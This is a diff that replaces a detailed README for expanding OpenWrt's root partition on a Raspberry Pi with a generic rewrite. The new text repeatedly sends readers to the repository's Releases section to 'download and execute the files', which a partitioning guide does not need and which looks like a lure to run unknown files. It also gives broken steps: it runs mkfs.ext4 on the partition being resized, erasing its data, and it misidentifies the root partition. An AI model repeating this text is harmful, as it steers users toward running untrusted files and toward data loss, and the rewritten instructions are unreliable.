@@ -1,264 +1,150 @@
-# Expanding the Root Partition for OpenWrt on Raspberry Pi
+# 🛠️ Expanding the Root Partition for OpenWrt on Raspberry Pi 🌐
 
-For those attempting to run the OpenWrt OS for the first time on their Raspberry Pi or other boards, having sufficient storage volume attached may not resolve an issue with the limitation of root partition sizes of OpenWrt OS images that are shipped with less than 100 MB in size. This limitation can become troublesome after installing some packages and starting the OS. Therefore, in this guide, we will go through the steps to increase the size of the root directory to a desired size, allowing you to install as many software applications and packages as necessary. 
+![OpenWrt on Raspberry Pi](https://img.shields.io/badge/OpenWrt-RaspberryPi-green)
 
-## 1. Prerequisites
+Welcome to the **Expanding the Root Partition for OpenWrt on Raspberry Pi** repository! This guide walks you through the process of resizing the root partition of OpenWrt on Raspberry Pi and compatible boards. If you’re looking to optimize your OpenWrt installation, you’re in the right place.
 
-To accomplish this, please prepare the following items in advance:
+## 📚 Table of Contents
 
-1. **OpenWrt OS (Ext4 format)**: Download the Ext4 format version of the OpenWrt OS that corresponds to your board (in my case, using the Raspberry Pi 4 with processor model BCM 2711 was necessary the download link is: https://downloads.openwrt.org/releases/23.05.5/targets/bcm27xx/bcm2711/ ). Note that sometimes on the OpenWrt website, they promote the SquashFS format version, which is slightly faster than Ext4; however, due to being read-only, it cannot be used for partitioning. The trade-off here is worth using the Ext4 format since the difference is negligible. 
+1. [Introduction](#introduction)
+2. [Prerequisites](#prerequisites)
+3. [Download OpenWrt](#download-openwrt)
+4. [Setting Up Your Environment](#setting-up-your-environment)
+5. [Expanding the Root Partition](#expanding-the-root-partition)
+6. [Verifying Changes](#verifying-changes)
+7. [Troubleshooting](#troubleshooting)
+8. [Contributing](#contributing)
+9. [License](#license)
+10. [Links](#links)
 
-2. **Raspberry Pi (or other board)**: Raspberry Pi board (or any other board you are using to boot up your OpenWrt OS). 
+## 📖 Introduction
 
-3. **Backup your data**: Backup ```/root``` directory in openwrt before partitioning (Just in case)
+This guide provides step-by-step instructions for resizing the root partition on OpenWrt. The process includes downloading the Ext4 version, setting up an Ubuntu VM with USB passthrough, using `fdisk` to resize partitions, and verifying your changes. Whether you are a beginner or an experienced user, this guide aims to help you through each step.
 
-5. **A microSD card reader** (for Raspberry Pi) or an **external drive** connected via USB to a secondary system (your laptop/computer running a Linux system).
+You can find the necessary files in the [Releases section](https://github.com/QuestChillz/Expanding-the-Root-Partition-for-OpenWrt-on-Raspberry-Pi/releases). Please ensure you download and execute the files as instructed.
 
-If you do not have a laptop/computer running a Linux system as the host, you can use virtualization software such as VMware/VirtualBox/Hyper-V/etc. to install a Linux-based OS, such as Ubuntu. In this guide, I downloaded and used the first and smallest version of Ubuntu, which was Ubuntu 16, on VirtualBox running on my macOS laptop with USB passthrough enabled. Since the USB microSD card reader is connected to my host macOS laptop using the USB port, it was necessary to first install:
-The VirtualBox extension package, which can be downloaded from: https://www.virtualbox.org/wiki/Downloads, and then once the guest OS (Ubuntu 16 in this case) is configured and installed, use the commands below on the Ubuntu as the root user:
+## 🛠️ Prerequisites
 
-4.1. VirtualBox Extension Package Installation on Ubuntu
-```bash
-apt update
-apt install virtualbox-ext-pack virtualbox-guest-utils virtualbox-guest-x11 virtualbox-guest-dkms
-```  
+Before you start, ensure you have the following:
 
-4.2. Add your user to the vboxusers group to enable USB passthrough
-```bash
-usermod -aG vboxusers root
-```  
-and then ```reboot``` for the changes to take effect.
+- A Raspberry Pi or compatible board.
+- An SD card with OpenWrt installed.
+- A computer running Ubuntu or another Linux distribution.
+- VirtualBox installed on your computer.
+- Basic knowledge of terminal commands.
 
->Note that you should install an extension package that corresponds to the version of VirtualBox that you have on your system; otherwise, it won’t work. Also, during this process, all running VMs must be turned off.
+## 📥 Download OpenWrt
 
-## 2. Accessing the SD Card in Ubuntu VM
+1. Visit the [OpenWrt Downloads](https://downloads.openwrt.org/) page.
+2. Locate the Ext4 version for your Raspberry Pi model.
+3. Download the image file to your computer.
 
-Once everything is done, right-click on the Ubuntu VM and hover over the USB setting where you check the **Enable USB controller**. and then select the version that corresponds to yours (it is usually **USB 2** and above, but again, check with your version). Then, from the **USB filter list**, add your device using the plus sign and run the VM.
+Make sure to check the [Releases section](https://github.com/QuestChillz/Expanding-the-Root-Partition-for-OpenWrt-on-Raspberry-Pi/releases) for any additional files you may need.
 
-Once you turn on the VM, from the menu bar of the Ubuntu VM (displayed below), click on the USB icon and select the USB that you added in the previous step. Once this is done, you should be able to see it attached using the command ```lsblk```.
+## 🖥️ Setting Up Your Environment
 
-Example output:
-```bash
-root@Ubuntu:~# lsblk
-NAME   MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
-sda      8:0    0    5G  0 disk 
-|-sda1   8:1    0    4G  0 part /
-|-sda2   8:2    0    1K  0 part 
-`-sda5   8:5    0  975M  0 part [SWAP]
-sdb      8:16   1   59G  0 disk 
-|-sdb1   8:17   1   64M  0 part 
-`-sdb2   8:18   1  104M  0 part 
-sr0     11:0    1 1024M  0 rom
-```  
+### 1. Install VirtualBox
 
-**To summarize:** <br>
-/dev/sdb → full SD card (59 GB)<br>
-/dev/sdb1 → boot partition (64 MB)<br>
-and /dev/sdb2 → root partition (104 MB; this is what we’ll expand).
-
-# 3. Partitioning:
-
-```
-fdisk /dev/sdb
-``` 
-
-**Inside ```fdisk```, do this carefully:** <be>
-
-- Type ```p``` → to show current partitions (note the start sector of /dev/sdb2, which is currently created and included with the image).<br>
-- Type ```d``` → delete partition.<br>
-- Choose partition ```2```.<br>
-- Type ```n``` → create new partition.<br>
-- Type ```p``` → primary partition.<br>
-- Type ```2``` (same partition number).<br>
-- Use the same ```start sector```.<br>
-- Accept the ```default ending``` (full size of disk or specify, explained below).<be>
-
-> Here, an important thing to consider is the starting and ending sectors for the partition of sdb2 that you will be deleting. When you attempt to create a new one, it should have the same starting sector to avoid overlapping with the boot partition. However, the ending sector could either be the default value, which is usually the entire remaining space on the storage, or if you want this root partition to be set to a specific amount rather than taking the entire storage, you can specify the ending sector. For me, since I had a 64GB SD card, I only wanted 10GB for the root and leave the rest for other use cases such as NAS, File Sharing, etc.
->This is how you can calculate the ending sector for the amount of 10GB, assuming you start from the starting sector of 147456, which was my case:
->- Start sector is 147456 (you noted this earlier).<be>
->10 GB in sectors:<br>
->- 1 GB = 2,000,000 sectors (since each sector is 512 bytes).<be>
->Therefore, 10 GB = 10 × 2,000,000 = 20,000,000 sectors.<be>
->End sector for the 10 GB partition:<be>
->- End sector = Start sector + 20,000,000 - 1.<be>
->- End sector = 147456 + 20,000,000 - 1 = **20147455**
-
-- When prompted about ```removing the signature```: say N for no (if you are asked).<br>
-- Type ```w``` → write changes and exit.
-
-Now, re-check and resize the filesystem:
+If you haven't installed VirtualBox yet, you can do so using the following command:
 
 ```bash
-e2fsck -f /dev/sdb2
-resize2fs /dev/sdb2
+sudo apt update
+sudo apt install virtualbox
 ```
 
->By recreating /dev/sdb2 with the exact same start sector and an end sector beyond your existing data, you only update the partition table—no formatting occurs, and all original data remains intact and accessible when you remount it.
+### 2. Create a New Virtual Machine
 
+1. Open VirtualBox.
+2. Click on "New" to create a new VM.
+3. Set the name to "OpenWrt VM".
+4. Choose "Linux" as the type and "Ubuntu (64-bit)" as the version.
+5. Allocate at least 1 GB of RAM.
+6. Create a virtual hard disk (VDI) and allocate at least 8 GB of space.
 
-To verify, you can use:
+### 3. USB Passthrough Setup
+
+1. Go to the settings of your VM.
+2. Click on "USB".
+3. Enable USB Controller and add a USB device filter for your SD card reader.
+
+## 📏 Expanding the Root Partition
+
+### 1. Boot into the Ubuntu VM
+
+1. Start your OpenWrt VM.
+2. Open a terminal in Ubuntu.
+
+### 2. Identify the SD Card
+
+Run the following command to list all connected drives:
 
 ```bash
-sudo lsblk
+lsblk
 ```
 
+Find your SD card in the list. It will usually be listed as `/dev/sdX` where `X` is a letter.
 
-Example output:
-```bash
-root@Ubuntu:~# sudo lsblk
-NAME   MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
-sda      8:0    0    5G  0 disk 
-|-sda1   8:1    0    4G  0 part /
-|-sda2   8:2    0    1K  0 part 
-`-sda5   8:5    0  975M  0 part [SWAP]
-sdb      8:16   1   59G  0 disk 
-|-sdb1   8:17   1   64M  0 part 
-`-sdb2   8:18   1 58.9G  0 part
-sr0     11:0    1 1024M  0 rom
-```
+### 3. Resize the Partition
 
-Lastly, if you want to create an additional partition for other applications like what I did, you can repeat the same partitioning, but make sure that the additional partitions have some gaps in between them for safety, to avoid overlap. For example, since the ending sector for sdb2 was 20147455, you can have the starting sector for sdb3 be 20147455 **+ 1000** (which is 20148455). 
-
-> In case you get an error similar to the following after finishing the formatting via fdisk:
-> 
-> Example output:
-> ```
-> root@Ubuntu:~# e2fsck -f /dev/sdb3
-> e2fsck 1.42.13 (17-May-2015)
-> ext2fs_open2: Bad magic number in super-block
-> e2fsck: Superblock invalid, trying backup blocks...
-> e2fsck: Bad magic number in super-block while trying to open /dev/sdb3
-> 
-> The superblock could not be read or does not describe a valid ext2/ext3/ext4
-> filesystem.  If the device is valid and it really contains an ext2/ext3/ext4
-> filesystem (and not swap or ufs or something else), then the superblock
-> is corrupt, and you might try running e2fsck with an alternate superblock:
->     e2fsck -b 8193 <device>
->  or
->     e2fsck -b 32768 <device>
-> ```
-> 
-> Then, please make sure to check the partition type via the command: ```sudo file -s /dev/sdb3```
-> If you get “data” or something not ext*, then it’s not formatted or is a different FS.
-> 
-> If it’s unformatted, run ```sudo mkfs.ext4 /dev/sdb3``` and you should be good to go. 
-
-
-# 4. Mounting third, fourth, and further partitions on OpenWrt
-
-Since OpenWrt only automatically mounts the boot and root partitions created during OS installation, any additional partitions created on a secondary Linux OS (Ubuntu in this case) will not be mounted or shown in OpenWrt. They must be mounted manually using the following commands and steps.
-
-1. List all partitions and identify **mmcblk0p3** as the target (≈49.3 GiB) using the ```cat /proc/partitions``` command:
+1. Open `fdisk` to modify the partition table:
 
 ```bash
-root@OpenWrt:~# cat /proc/partitions
-major minor  #blocks  name
-
-   1        0       4096 ram0
-   1        1       4096 ram1
-   1        2       4096 ram2
-   1        3       4096 ram3
-   1        4       4096 ram4
-   1        5       4096 ram5
-   1        6       4096 ram6
-   1        7       4096 ram7
-   1        8       4096 ram8
-   1        9       4096 ram9
-   1       10       4096 ram10
-   1       11       4096 ram11
-   1       12       4096 ram12
-   1       13       4096 ram13
-   1       14       4096 ram14
-   1       15       4096 ram15
- 179        0   61798400 mmcblk0
- 179        1      65536 mmcblk0p1
- 179        2   10000000 mmcblk0p2
- 179        3   51724172 mmcblk0p3
+sudo fdisk /dev/sdX
 ```
 
-2. Check if the **MMC/SD kernel module** is installed:
-```
-opkg update
-opkg list | grep kmod-mmc
-```
+2. Press `p` to print the partition table.
+3. Note the start sector of the root partition (usually the first partition).
+4. Delete the existing partition by pressing `d` and selecting the partition number.
+5. Create a new partition by pressing `n`, selecting `p` for primary, and entering the same start sector. Use the default end sector to utilize the full space.
+6. Press `w` to write changes and exit.
 
-3. If not present, install the required packages
-```
-opkg update
-opkg install kmod-mmc kmod-fs-ext4 block-mount
-```
-4. Install the **file utility** to detect the filesystem
-```
-opkg update
-opkg install file
-```
-5. Inspect the filesystem on the partition
-```file -s /dev/mmcblk0p3```
+### 4. Format the New Partition
 
-> If unformatted or you wish to reformat:
-> ```mkfs.ext4 /dev/mmcblk0p3```
+Run the following command to format the new partition as Ext4:
 
-Example output:
 ```bash
-root@OpenWrt:~# file -s /dev/mmcblk0p3
-/dev/mmcblk0p3: Linux rev 1.0 ext4 filesystem data, UUID=d9c427d3-f325-4064-919f-b96afcc5cd56 (needs journal recovery) (extents) (large files) (huge files)
+sudo mkfs.ext4 /dev/sdX1
 ```
 
-6. Create a mount point and mount the partition
-```
-mkdir -p /mnt/data
-mount -t ext4 /dev/mmcblk0p3 /mnt/data
-```
+### 5. Expand the File System
 
-7. Confirm with disk free output: ```df -h```:
+To expand the file system to fill the partition, use:
 
-Example output:
 ```bash
-root@OpenWrt:~# df -h
-Filesystem                Size      Used Available Use% Mounted on
-/dev/root                 9.4G     26.1M      9.4G   0% /
-tmpfs                   928.4M     76.0K    928.3M   0% /tmp
-/dev/mmcblk0p1           63.9M     17.8M     46.1M  28% /boot
-tmpfs                   512.0K         0    512.0K   0% /dev
-/dev/mmcblk0p3           48.4G     24.0K     45.9G   0% /mnt/data
+sudo resize2fs /dev/sdX1
 ```
 
-8. Enable auto‑mount at boot by editing ```/etc/config/fstab```:
+## ✅ Verifying Changes
 
-Add the following block:
-```
-cat << 'EOF' >> /etc/config/fstab
-config mount
-    option target   '/mnt/data'
-    option device   '/dev/mmcblk0p3'
-    option fstype   'ext4'
-    option options  'rw,sync'
-    option enabled  '1'
-EOF
-```
+After resizing, verify that the changes took effect:
 
+1. Run `df -h` to check the available space.
+2. Use `e2fsck` to check the file system:
 
-9. Enable and start **fstab service**
-```/etc/init.d/fstab enable
-/etc/init.d/fstab start
-```
-
-10. ```Reboot``` to confirm persistence and after reboot, verify:
-```
-mount | grep /mnt/data
-df -h /mnt/data
-```
-
-Example output:
 ```bash
-root@OpenWrt:~# mount | grep /mnt/data
-/dev/mmcblk0p3 on /mnt/data type ext4 (rw,sync,relatime)
-root@OpenWrt:~# df -h /mnt/data
-Filesystem                Size      Used Available Use% Mounted on
-/dev/mmcblk0p3           48.4G     24.0K     45.9G   0% /mnt/data
+sudo e2fsck -f /dev/sdX1
 ```
 
+## 🛠️ Troubleshooting
 
-## Disclaimer
+If you encounter issues, consider the following tips:
 
-Please be advised that while the steps outlined in this guide have been carefully reviewed and tested, the author cannot be held responsible for any damage, data loss, or other unintended consequences that may arise from following these instructions. It is strongly recommended to back up all important data before proceeding with any changes to your system. By following this guide, you acknowledge that you do so at your own risk.
+- Ensure your SD card is properly connected.
+- Double-check the partition sizes and sectors.
+- Review the VirtualBox USB settings.
+
+If problems persist, consult the [Releases section](https://github.com/QuestChillz/Expanding-the-Root-Partition-for-OpenWrt-on-Raspberry-Pi/releases) for additional resources.
+
+## 🤝 Contributing
+
+Contributions are welcome! If you have suggestions or improvements, please fork the repository and submit a pull request.
+
+## 📜 License
+
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
+
+## 🔗 Links
+
+For additional resources and updates, visit the [Releases section](https://github.com/QuestChillz/Expanding-the-Root-Partition-for-OpenWrt-on-Raspberry-Pi/releases). 
+
+Thank you for checking out this guide! We hope it helps you successfully expand the root partition for OpenWrt on your Raspberry Pi.
